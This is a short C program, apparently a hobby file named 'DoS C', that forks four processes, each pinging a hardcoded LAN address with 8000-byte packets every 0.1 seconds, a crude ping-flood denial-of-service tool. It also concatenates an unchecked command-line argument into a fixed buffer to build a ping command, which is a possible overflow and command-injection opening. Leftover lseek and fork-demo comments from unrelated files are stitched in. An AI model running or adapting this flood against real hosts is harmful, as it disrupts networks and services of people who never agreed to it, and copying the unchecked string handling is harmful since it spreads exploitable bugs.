//
//  main.c
//  DoS C
//
//  Created by Arsalan Iravani on 12.08.2017.
//  Copyright © 2017 Arsalan Iravani. All rights reserved.
//
//
//  main.cpp
//  lseek
//
//  Created by Arsalan Iravani on 14.02.17.
//  Copyright © 2017 Arsalan Iravani. All rights reserved.
//

/*
 
 The lseek() function repositions the file offset of the open file
 description associated with the file descriptor fd to the argument
 offset according to the directive whence as follows:
 
 SEEK_SET
 The file offset is set to offset bytes.
 
 SEEK_CUR
 The file offset is set to its current location plus offset
 bytes.
 
 SEEK_END
 The file offset is set to the size of the file plus offset
 bytes.
 
 The lseek() function allows the file offset to be set beyond the end
 of the file (but this does not change the size of the file).  If data
 is later written at this point, subsequent reads of the data in the
 gap (a "hole") return null bytes ('\0') until data is actually
 written into the gap.
 
 */

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

#ifndef BUFFSIZE
#define BUFFSIZE 4096
#endif

int main (int argc, char **argv){
    
    char buf[BUFFSIZE];
    
    //    if (argc > 0)
    //        for (int i=0; i<argc; i++)
    //            printf("Argument %d:\t\t%s\n", i, argv[i]);
    
    buf[0] = '\0';
    
    char start[6] = "ping ";
    char end[16] = " -s 8000 -i 0.1";
    
    strcat(buf, start);
    strcat(buf, argv[1]);
    
    char fileName[16] = "a.txt";
    
    /// Create file
    int fd2 = open(fileName, O_RDWR | O_CREAT | O_TRUNC , S_IRWXU | S_IRWXG | S_IRWXO);
    
    /// Write to file
    write(fd2, buf, strlen(buf));
    
    /// Append the end of a command
    write(fd2, end, strlen(end));
    
    buf[strlen(buf)] = '\0';
    
    for (int i = 0; i<4; i++) {
        pid_t pid=fork();
        
        if (pid==0) { /* child process */
            static char *argv[] = {"ping", "192.168.0.3", "-s 8000", "-i 0.1", NULL};
            //        static char *argv[] = {buf, NULL};
            execv("/sbin/ping", argv);
            puts("Could not exec file");
            exit(127); /* only if execv fails */
        }   /* pid!=0; parent process */
//            waitpid(pid, 0, 0); /* wait for child to exit */
    }
    
    close(fd2);
    return 0;
}


/*int pid = fork();
 
 if (pid < 0)
 exit(EXIT_FAILURE);
 else if (pid == 0) { // child
 printf("\t\tChild\n");
 printf("I'm a child, my process id:\t\t%d\n", getpid());
 
 int parent = getppid();
 
 parent == 1 ? printf("I'm an orphan\n") : printf("My parent's process id:\t\t\t%d\n", getppid());
 
 exit(69);
 }
 
 else { // parent
 printf("\t\tParent\n");
 printf("Waiting for child to complete\n");
 
 sleep(1);
 
 int exit_status;
 wait(&exit_status);
 
 printf("\t\tParent\n");
 
 printf("I am a parent, my process id:\t\t%d\n", getpid());
 printf("My child's process id:\t\t\t%d\n\n", pid);
 
 if (WIFSIGNALED(exit_status))
 printf("Signal has interrupted the child:\t%d\n", WTERMSIG(exit_status));
 
 printf("My child exited with status:\t%d\n\n", WEXITSTATUS(exit_status));
 }
 
 */






















